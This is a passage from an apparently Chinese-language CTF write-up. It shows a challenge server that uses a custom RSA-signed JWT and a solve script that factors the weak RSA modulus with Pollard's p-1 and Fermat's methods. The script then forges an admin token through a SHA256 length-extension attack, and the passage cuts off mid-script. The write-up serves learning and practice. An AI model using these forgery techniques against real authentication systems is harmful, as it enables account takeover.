inverse(<span class="variable language_">self</span>.e, (p - <span class="number">1</span>) * (q ** <span class="number">2</span> - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_forward_prime</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            p = <span class="number">2</span></span><br><span class="line">            <span class="keyword">while</span> size(p) &lt; <span class="number">527</span>:</span><br><span class="line">                p *= getPrime(randrange(<span class="number">4</span>, <span class="number">17</span>))</span><br><span class="line">            <span class="keyword">if</span> isPrime(p + <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">return</span> p + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_backward_prime</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            p = getPrime(<span class="number">240</span>)</span><br><span class="line">            <span class="keyword">if</span> isPrime(p) <span class="keyword">and</span> isPrime(p + <span class="number">2</span>):</span><br><span class="line">                <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">public_key</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">return</span> json.dumps({<span class="string">"e"</span>: <span class="variable language_">self</span>.e, <span class="string">"n"</span>: <span class="variable language_">self</span>.n})</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">private_key</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">return</span> json.dumps({<span class="string">"d"</span>: <span class="variable language_">self</span>.d, <span class="string">"n"</span>: <span class="variable language_">self</span>.n})</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">self, message: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="keyword">return</span> long_to_bytes(<span class="built_in">pow</span>(bytes_to_long(message), <span class="variable language_">self</span>.d, <span class="variable language_">self</span>.n))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">self, message: <span class="built_in">bytes</span>, signature: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="keyword">return</span> message == long_to_bytes(<span class="built_in">pow</span>(bytes_to_long(signature), <span class="variable language_">self</span>.e, <span class="variable language_">self</span>.n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JWT256</span>(abc.ABC):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, secret: <span class="built_in">bytes</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.secret = secret</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">alg</span>(<span class="params">self</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.__class__.__name__.encode()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">self</span>) -&gt; datetime.timedelta:</span><br><span class="line">        <span class="keyword">return</span> datetime.timedelta(minutes=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">typ</span>(<span class="params">self</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"JWT256"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">base64encode</span>(<span class="params">cls, data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        data = base64.b64encode(data).decode()</span><br><span class="line">        data = data.replace(<span class="string">"+"</span>, <span class="string">"-"</span>).replace(<span class="string">"/"</span>, <span class="string">"_"</span>)</span><br><span class="line">        <span class="keyword">return</span> data.rstrip(<span class="string">"="</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">base64decode</span>(<span class="params">cls, data: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        data = data.replace(<span class="string">"-"</span>, <span class="string">"+"</span>).replace(<span class="string">"_"</span>, <span class="string">"/"</span>)</span><br><span class="line">        data = data + <span class="string">"="</span> * (-<span class="built_in">len</span>(data) % <span class="number">4</span>)</span><br><span class="line">        <span class="keyword">return</span> base64.b64decode(data.encode())</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">cls, data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">dict</span>[<span class="built_in">bytes</span>, <span class="built_in">bytes</span>]:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">dict</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> item: item.split(<span class="string">b"="</span>, <span class="number">1</span>), data.split(<span class="string">b"&amp;"</span>)))</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">unparse</span>(<span class="params">cls, data: <span class="built_in">dict</span>[<span class="built_in">bytes</span>, <span class="built_in">bytes</span>]</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"&amp;"</span>.join(<span class="built_in">map</span>(<span class="string">b"="</span>.join, data.items()))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">self, payload: <span class="built_in">dict</span>[<span class="built_in">bytes</span>, <span class="built_in">bytes</span>]</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        header = <span class="variable language_">self</span>.generate_header()</span><br><span class="line">        body = <span class="variable language_">self</span>.generate_body(payload)</span><br><span class="line">        signature = <span class="variable language_">self</span>.generate_signature(header + <span class="string">b"."</span> + body)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"."</span>.join(<span class="variable language_">self</span>.base64encode(payload) <span class="keyword">for</span> payload <span class="keyword">in</span> (header, body, signature))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">self, token: <span class="built_in">str</span></span>) -&gt; <span class="built_in">dict</span>[<span class="built_in">bytes</span>, <span class="built_in">list</span>[<span class="built_in">bytes</span>]]:</span><br><span class="line">        header, body, signature = <span class="built_in">tuple</span>(<span class="variable language_">self</span>.base64decode(payload) <span class="keyword">for</span> payload <span class="keyword">in</span> token.split(<span class="string">"."</span>))</span><br><span class="line">        <span class="variable language_">self</span>.verify_header(header)</span><br><span class="line">        <span class="variable language_">self</span>.verify_body(body)</span><br><span class="line">        <span class="variable language_">self</span>.verify_signature(header + <span class="string">b"."</span> + body, signature)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.parse(body)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_body</span>(<span class="params">self, payload: <span class="built_in">dict</span>[<span class="built_in">bytes</span>, <span class="built_in">bytes</span>]</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        payload[<span class="string">b"iat"</span>] = <span class="string">f"<span class="subst">{<span class="built_in">int</span>(datetime.datetime.now().timestamp())}</span>"</span>.encode()</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.unparse(payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_header</span>(<span class="params">self</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        payload = {<span class="string">b"alg"</span>: <span class="variable language_">self</span>.alg, <span class="string">b"typ"</span>: <span class="variable language_">self</span>.typ}</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.unparse(payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_signature</span>(<span class="params">self, message: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="keyword">return</span> hashlib.sha256(<span class="variable language_">self</span>.secret + message).digest()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify_body</span>(<span class="params">self, body: <span class="built_in">bytes</span></span>):</span><br><span class="line">        issued_at = <span class="built_in">int</span>(<span class="variable language_">self</span>.parse(body)[<span class="string">b"iat"</span>].decode())</span><br><span class="line">        <span class="keyword">if</span> datetime.datetime.fromtimestamp(issued_at) + <span class="variable language_">self</span>.exp &lt; datetime.datetime.now():</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">"Verify body failed."</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify_header</span>(<span class="params">self, header: <span class="built_in">bytes</span></span>):</span><br><span class="line">        payload = <span class="variable language_">self</span>.parse(header)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (<span class="variable language_">self</span>.alg == payload[<span class="string">b"alg"</span>] <span class="keyword">and</span> <span class="variable language_">self</span>.typ == payload[<span class="string">b"typ"</span>]):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">"Verify header failed."</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify_signature</span>(<span class="params">self, message: <span class="built_in">bytes</span>, signature: <span class="built_in">bytes</span></span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.generate_signature(message) != signature:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">"Verify signature failed."</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RS256</span>(<span class="title class_ inherited__">JWT256</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, secret: <span class="built_in">bytes</span>, key: RsaKey</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(secret)</span><br><span class="line">        <span class="variable language_">self</span>.key = key</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_signature</span>(<span class="params">self, message: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.key.sign(<span class="built_in">super</span>().generate_signature(message))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify_signature</span>(<span class="params">self, message: <span class="built_in">bytes</span>, signature: <span class="built_in">bytes</span></span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.key.verify(<span class="built_in">super</span>().generate_signature(message), signature):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">"Verify signature failed."</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_server</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"./server.py"</span>, <span class="string">"r"</span>, encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="built_in">print</span>(file.read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    provider = RS256(os.urandom(randrange(<span class="number">37</span>, <span class="number">43</span>)), RsaKey())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"public_key: <span class="subst">{provider.key.public_key}</span>"</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"&gt; register"</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"&gt; login"</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"&gt; server.py"</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"&gt; exit"</span>)</span><br><span class="line">        cmd = <span class="built_in">input</span>(<span class="string">"&gt; Command: "</span>)</span><br><span class="line">        <span class="keyword">if</span> cmd == <span class="string">"exit"</span>:</span><br><span class="line">            sys.exit()</span><br><span class="line">        <span class="keyword">elif</span> cmd == <span class="string">"register"</span>:</span><br><span class="line">            username = <span class="built_in">input</span>(<span class="string">"&gt; Input username: "</span>).strip()</span><br><span class="line">            token = provider.encode({<span class="string">b"username"</span>: username.encode(), <span class="string">b"admin"</span>: <span class="string">b"N"</span>})</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"Hi <span class="subst">{username}</span>, your token is: <span class="subst">{token}</span>"</span>)</span><br><span class="line">        <span class="keyword">elif</span> cmd == <span class="string">"login"</span>:</span><br><span class="line">            data = provider.decode(<span class="built_in">input</span>(<span class="string">"&gt; Input token: "</span>).strip())</span><br><span class="line">            username = data[<span class="string">b"username"</span>].decode()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"Hi <span class="subst">{username}</span>."</span>)</span><br><span class="line">            <span class="keyword">if</span> data[<span class="string">b"admin"</span>] == <span class="string">b"Y"</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f"Administrator can read the flag: <span class="subst">{FLAG}</span>"</span>)</span><br><span class="line">        <span class="keyword">elif</span> cmd == <span class="string">"server.py"</span>:</span><br><span class="line">            read_server()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"Bad hacker"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        main()</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"Login failed."</span>)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br></pre></td></tr></tbody></table></figure><p>這題超級麻煩，要構造一組 token 使得 JWT 驗證出來 header 正確， body正確（在有效時間）， signature 正確，其中 signature 是把 header 和 bodysha256 後再做一次 RSA 加密，不過原理倒是不難，因為 RSA <code>p-1</code>是 smooth 的，可以用 Pollard’s p-1 factorization 攻擊，sha256 要 hash的是 secret + {header + ‘.’ + body} ，因為 prase時後面如果有跟前面相同的鍵值會蓋掉前面的，所以就可以用 LEA 攻擊， 其中<code>secret</code> 的長度只有可能是 37~43 就一直猜就會對了</p><figure class="highlight python"><figcaption><span>solve.py</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> GCD</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pollard</span>(<span class="params">n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    a, b = <span class="number">2</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a = <span class="built_in">pow</span>(a, b, n)</span><br><span class="line">        p = GCD(a - <span class="number">1</span>, n)</span><br><span class="line">        <span class="keyword">if</span> <span class="number">1</span> &lt; p &lt; n:</span><br><span class="line">            <span class="keyword">return</span> p</span><br><span class="line">        b += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fermat</span>(<span class="params">n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>]:</span><br><span class="line">    a = gmpy2.isqrt(n) + <span class="number">1</span></span><br><span class="line">    b = a ** <span class="number">2</span> - n</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> gmpy2.iroot(b, <span class="number">2</span>)[<span class="number">1</span>]:</span><br><span class="line">        a += <span class="number">1</span></span><br><span class="line">        b = a ** <span class="number">2</span> - n</span><br><span class="line">    b = gmpy2.iroot(b, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> (a + b, a - b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new_encode</span>(<span class="params">data</span>):</span><br><span class="line">    data = base64.b64encode(data).decode()</span><br><span class="line">    data = data.replace(<span class="string">"+"</span>, <span class="string">"-"</span>).replace(<span class="string">"/"</span>, <span class="string">"_"</span>)</span><br><span class="line">    <span class="keyword">return</span> data.rstrip(<span class="string">"="</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new_decode</span>(<span class="params">data</span>):</span><br><span class="line">    data = data.replace(<span class="string">"-"</span>, <span class="string">"+"</span>).replace(<span class="string">"_"</span>, <span class="string">"/"</span>)</span><br><span class="line">    data = data + <span class="string">"="</span> * (-<span class="built_in">len</span>(data) % <span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> base64.b64decode(data.encode())</span><br><span class="line"></span><br><span class="line">n = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">"n: "</span>))</span><br><span class="line"></span><br><span class="line">p = pollard(n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"p: <span class="subst">{p}</span>"</span>)</span><br><span class="line"></span><br><span class="line">q, r = fermat(n//p)</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>) * (r - <span class="number">1</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"d: <span class="subst">{d}</span>"</span>)</span><br><span class="line"></span><br><span class="line">ori_token = <span class="built_in">input</span>(<span class="string">"ori_token: "</span>).split(<span class="string">"."</span>)</span><br><span class="line"></span><br><span class="line">ori_header = new_decode(ori_token[<span class="number">0</span>])</span><br><span class="line">ori_body = new_decode(ori_token[<span class="number">1</span>])</span><br><span class="line">ori_sig = new_decode(ori_token[<span class="number">2</span>])</span><br><span class="line">message = ori_header + <span class="string">b"."</span> + ori_body</span><br><span class="line">hash_ori = long_to_bytes(<span class="built_in">pow</span>(bytes_to_long(ori_sig), e, n))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"message: <span class="subst">{message}</span>"</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"ori_sig: <span class="subst">{ori_sig}</span>"</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"hash_ori: <span class="subst">{hash_ori}</span>"</span>)</span><br><span class="line"></span><br><span class="line">secret_length = <span class="number">39</span> <span class="comment"># guess 37 ~ 43</span></span><br><span class="line">append_data = <span class="string">b'&amp;admin=Y&amp;iat=1839001735'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###### LEA ######</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rightrotate</span>(<span class="params">x, n</span>):</span><br><span class="line">    <span class="keyword">return</span> ((x &gt;&gt; n) | (x &lt;&lt; (<span class="number">32</span> - n))) &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SHA256</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, state=<span class="literal">None</span>, count=<span class="number">0</span></span>):</span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        state: 8個 32 位元整數，表示 SHA256 的中間狀態</span></span><br><span class="line"><span class="string">        count: 已處理的位元組數（不包含目前尚未處理的資料）</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> state <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="comment"># SHA256 的初始向量 IV</span></span><br><span class="line">            <span class="variable language_">self</span>.h = [</span><br><span class="line">                <span class="number">0x6a09e667</span>,</span><br><span class="line">                <span class="number">0xbb67ae85</span>,</span><br><span class="line">                <span class="number">0x3c6ef372</span>,</span><br><span class="line">                <span class="number">0xa54ff53a</span>,</span><br><span class="line">                <span class="number">0x510e527f</span>,</span><br><span class="line">                <span class="number">0x9b05688c</span>,</span><br><span class="line">                <span class="number">0x1f83d9ab</span>,</span><br><span class="line">                <span class="number">0x5be0cd19</span>,</span><br><span class="line">            ]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="variable language_">self</span>.h = state[:]  <span class="comment"># 複製一份狀態</span></span><br><span class="line">        <span class="variable language_">self</span>.unprocessed = <span class="string">b''</span></span><br><span class="line">        <span class="variable language_">self</span>.message_byte_length = count</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="variable language_">self</span>.unprocessed += data</span><br><span class="line">        <span class="variable language_">self</span>.message_byte_length += <span class="built_in">len</span>(data)</span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(<span class="variable language_">self</span>.unprocessed) &gt;= <span class="number">64</span>:</span><br><span class="line">            <span class="variable language_">self</span>._handle(<span class="variable language_">self</span>.unprocessed[:<span class="number">64</span>])</span><br><span class="line">            <span class="variable language_">self</span>.unprocessed = <span class="variable language_">self</span>.unprocessed[<span class="number">64</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_handle</span>(<span class="params">self, chunk</span>):</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(chunk) == <span class="number">64</span></span><br><span class="line">        w = <span class="built_in">list</span>(struct.unpack(<span class="string">'&gt;16L'</span>, chunk))</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>, <span class="number">64</span>):</span><br><span class="line">            s0 = rightrotate(w[i-<span class="number">15</span>], <span class="number">7</span>) ^ rightrotate(w[i-<span class="number">15</span>], <span class="number">18</span>) ^ (w[i-<span class="number">15</span>] &gt;&gt; <span class="number">3</span>)</span><br><span class="line">            s1 = rightrotate(w[i-<span class="number">2</span>], <span class="number">17</span>) ^ rightrotate(w[i-<span class="number">2</span>], <span class="number">19</span>) ^ (w[i-<span class="number">2</span>] &gt;&gt; <span class="number">10</span>)</span><br><span class="line">            w.append((w[i-<span class="number">16</span>] + s0 + w[i-<span class="number">7</span>] + s1) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">        a, b, c, d, e, f, g, h_val = <span class="variable language_">self</span>.h</span><br><span class="line">        k = [</span><br><span class="line">            <span class="number">0x428a2f98</span>, <span class="number">0x71374491</span>, <span class="number">0xb5c0fbcf</span>, <span class="number">0xe9b5dba5</span>,</span><br><span class="line">            <span class="number">0x3956c25b</span>, <span class="number">0x59f111f1</span>, <span class="number">0x923f82a4</span>, <span class="number">0xab1c5ed5</span>,</span><br><span class="line">            <span class="number">0xd807aa98</span>, <span class="number">0x12835b01</span>, <span class="number">0x243185be</span>, <span class="number">0x550c7dc3</span>,</span><br><span class="line">            <span class="number">0x72be5d74</span>, <span class="number">0x80deb1fe</span>, <span class="number">0x9bdc06a7</span>, <span class="number">0xc19bf174</span>,</span><br><span class="line">            <span class="number">0xe49b69c1</span>, <span class="number">0xefbe4786</span>, <span class="number">0x0fc19dc6</span>, <span class="number">0x240ca1cc</span>,</span><br><span class="line">            <span class="number">0x2de92c6f</span>, <span class="number">0x4a7484aa</span>, <span class="number">0x5cb0a9dc</span>, <span class="number">0x76f988da</span>,</span><br><span class="line">            <span class="number">0x983e5152</span>, <span class="number">0xa831c66d</span>, <span class="number">0xb00327c8</span>, <span class="number">0xbf597fc7</span>,</span><br><span class="line">            <span class="number">0xc6e00bf3</span>, <span class="number">0xd5a79147</span>, <span class="number">0x06ca6351</span>, <span class="number">0x14292967</span>,</span><br><span class="line">            <span class="number">0x27b70a85</span>, <span class="number">0x2e1b2138</span>, <span class="number">0x4d2c6dfc</span>, <span class="number">0x53380d13</span>,</span><br><span class="line">            <span class="number">0x650a7354</span>, <span class="number">0x766a0abb</span>, <span class="number">0x81c2c92e</span>, <span class="number">0x92722c85</span>,</span><br><span class="line">            <span class="number">0xa2bfe8a1</span>, <span class="number">0xa81a664b</span>, <span class="number">0xc24b8b70</span>, <span class="number">0xc76c51a3</span>,</span><br><span class="line">            <span class="number">0xd192e819</span>, <span class="number">0xd6990624</span>, <span class="number">0xf40e3585</span>, <span class="number">0x106aa070</span>,</span><br><span class="line">            <span class="number">0x19a4c116</span>, <span class="number">0x1e376c08</span>, <span class="number">0x2748774c</span>, <span class="number">0x34b0bcb5</span>,</span><br><span class="line">            <span class="number">0x391c0cb3</span>, <span class="number">0x4ed8aa4a</span>, <span 